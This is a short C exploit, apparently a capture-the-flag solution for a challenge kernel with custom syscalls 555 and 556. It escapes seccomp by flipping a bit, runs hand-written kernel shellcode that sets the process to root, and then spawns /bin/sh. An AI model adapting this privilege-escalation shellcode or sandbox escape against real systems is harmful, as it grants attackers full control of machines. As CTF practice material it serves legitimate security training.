#define _GNU_SOURCE
#include <assert.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>

int main() {
    int r;

    printf("[solve] Sanity check: syscall 556 should be blocked");
    r = syscall(556, 0, 0);
    printf("[solve] syscall(556) = %d\n", r);
    assert(r == -1);

    printf("[solve] Escaping seccomp");

    unsigned long offset = 1;
    unsigned long bit = 0;
    r = syscall(555, offset, bit);
    printf("[solve] syscall(555) = %d\n", r);
    assert(r == 0);

    printf("[solve] UID before escalating privs: %d\n", getuid());

    char escalate_privs[31] = {0x48, 0x31, 0xff, 0x48, 0xb9, 0xc0, 0x81, 0x08,
                               0x81, 0xff, 0xff, 0xff, 0xff, 0xff, 0xd1, 0x48,
                               0x89, 0xc7, 0x48, 0xb9, 0x80, 0x7e, 0x08, 0x81,
                               0xff, 0xff, 0xff, 0xff, 0xff, 0xd1, 0xc3};

    r = syscall(556, escalate_privs, 31);
    printf("[solve] syscall(556) = %d\n", r);
    assert(r == 0);

    printf("[solve] UID after escalating privs: %d\n", getuid());
    assert(getuid() == 0);

    // This child process should still be seccomped, but it doesn't matter
    execlp("/bin/sh", "/bin/sh", NULL);

    return 0;
}
